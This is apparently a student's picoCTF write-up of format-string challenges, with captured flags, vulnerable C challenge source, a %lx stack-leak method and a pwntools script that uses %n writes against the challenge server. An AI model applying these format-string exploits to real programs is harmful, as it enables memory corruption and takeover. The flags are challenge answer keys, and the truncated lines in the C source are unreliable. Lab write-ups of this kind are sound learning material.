# format string 0

**Flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}`


Approach

- step 1<br>
In the challenge, the goal is to reach the sigsegv_handler, which prints the flag when a segmentation fault occurs.
By entering a very long string  that exceeds the buffer limits, the program reads more data than possible.
This causes a memory fault, which raises a segmentation fault. When this happens, the sigsegv_handler gets triggered.
The sigsegv_handler then outputs the flag stored in flag.

```
  
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with you
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}

```


![](https://github.com/adityachawla005/cryptonite_taskphase_Aditya/raw/main/TP2/Binary%20Exploitation/picoCTF/assets/fs1.png)



What you learned through solving this challenge:
<br>
- Learning about stack reads and printf exploitation.


Other incorrect methods you tried:
<br>
- Tried to give input with the options provided in the prompt.


References
<br>
- none


<br>
<br>
<br>

# format string 1

**Flag:** `picoCTF{4n1m41_57y13_4x4_f14g_91_35fd4e}`


Approach

- step 1<br>
On 64b systems, the first 5 %lx as input  will print the contents of the rsi, rdx, rcx, r8,
and r9, and any additional %lx will start printing successive stack lines.
We require these hex codes to get the flag:
7b4654436f636970,355f31346d316e34,3478345f33317937,31395f673431665f,7d653464663533

- step 2<br>
Now we form the flag after converting them to strings we count 8 bits,reverse and write them as they are big-endian.

![](https://github.com/adityachawla005/cryptonite_taskphase_Aditya/raw/main/TP2/Binary%20Exploitation/picoCTF/assets/fs2.png)



What you learned through solving this challenge:
<br>
- Learning about a segmentation error.


Other incorrect methods you tried:
<br>
- Tried to give input as %x and %p for pointer memory address.


References
<br>
- [Hint in level](https://lettieri.iet.unipi.it/hacking/format-strings.pdf)


<br>
<br>
<br>

# format string 2

**Flag:** `picoCTF{f0rm47_57r?_f0rm47_m3m_741fa290}`


Approach

- step 1<br>
For this challenge we make use of a format string attack to change the value of sus variable.
First we calculate the offset bby using the Fmtstr tools from pwntools.
Then we make use of write-what-where exploit to send a payload with %n specifier to write the value of sus as 0x67616c66.
We can write the following script


```

 from pwn import *

elf = context.binary = ELF('./vuln')

def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    response = p.recvall()
    p.close()
    return response

offset = FmtStr(send_payload).offset
info(f"{offset=}")
info(f"{elf.symbols['sus']=}")

p = remote('rhea.picoctf.net', 65006)

payload = fmtstr_payload(offset, {elf.symbols['sus']: 0x67616c66})

p.sendline(payload)

info(p.recvall().decode())

p.close()
```

![](https://github.com/adityachawla005/cryptonite_taskphase_Aditya/raw/main/TP2/Binary%20Exploitation/picoCTF/assets/fs3.png)



What you learned through solving this challenge:
<br>
- About payload,offset format string attack and FmtStr tool from pwn tools.


Other incorrect methods you tried:
<br>
- none


References
<br>
- Challenge hint 
-[PwnTools](https://docs.pwntools.com/en/stable/fmtstr.html)


<br>
<br>
<br>

# format string 3

**Flag:** ``


Approach

- step 1<br>
Trying to understand global offset table GOT ,shared files libc and using Ghidra to view libc and addresses of GOT functions.
Also how Address Leak ASLR is taking place and how to  get system function symbols to execute it.

```

```



What you learned through solving this challenge:
<br>
-GOT,libc and How interpreter links the shared library files to program at runtime.

Other incorrect methods you tried:
<br>
- none


References
<br>
- 


<br>
<br>
<br>




